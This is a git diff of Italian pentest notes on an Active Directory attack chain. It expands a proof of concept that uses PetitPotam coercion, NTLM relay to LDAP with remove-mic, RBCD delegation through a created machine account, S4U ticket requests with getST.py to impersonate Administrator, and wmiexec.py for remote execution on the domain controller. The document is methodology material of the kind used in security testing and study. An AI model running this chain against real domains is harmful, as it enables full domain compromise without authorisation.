@@ -22,7 +22,7 @@ Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco 
 
 #### Proof of Concept
 
-➤ Set-up NTLM relay verso il servizio LDAP su l'altro Domain Controller
+➤ Set-up NTLM relay verso il servizio LDAP su l'altro Domain Controller. Usi remove-mic per rimuovere la protezione e quindi sfruttare la debolezza di NTLMv1.
 
 ```
 Terminale 1:
@@ -38,9 +38,9 @@ Terminale 2:
 python3 PetitPotam.py -d <domain> <IP Attacker> <DC1 IP>
 ```
 
-➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina che gli viene assegnata la delega di impersonificare qualsiasi utente dentro DC1
+➤ La macchina attaccante riceve NTLM e lo inoltra al secondo DC tramite LDAP. Nello specifico l'attacco porta alla creazione di un nuovo computer macchina ed essa viene inserita nel campo attributo msDS-AllowedToActOnBehalfOfOtherIdentity del Domain Controller con la delega di impersonificare Administrator dentro DC1
 
-➤ Viene forgiato un Silver Ticket per impersonificare un Amminsitratore dentro DC1. Ti salva il TGS in Administrator.ccache
+➤ Viene forgiato un Silver Ticket per impersonificare un Amministratore dentro DC1. Ti salva il TGS in Administrator.ccache. In particolare viene usato sia S4U2Self che S4U2Proxy. In parole povere se puoi fare RCBD con ntlmv1 è possibile per design di Windows richiedere un TGS per spn cfs sul domain controller vittima, anche se S4U2Proxy è disabilitato perchè puoi richiederlo prima per S4USelf poi fare il forward.  
 
 ```
 python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<username computer macchina creato>'
@@ -51,6 +51,8 @@ python3 getST.py -spn cifs/<FQDN DC1> -impersonate Administrator <domain>/'<user
 ```
 KRB5CCNAME=Administrator.ccache python3 wmiexec.py -k -no-pass @FQDN DC1 
 ```
+
+![Logo del progetto](https://www.tarlogic.com/wp-content/uploads/2020/02/attack_RBCD-2.png)
 
 -----------------
 ### Attacco 2. Enumerazione AD da non autenticato sfruttando MITM6 🕵
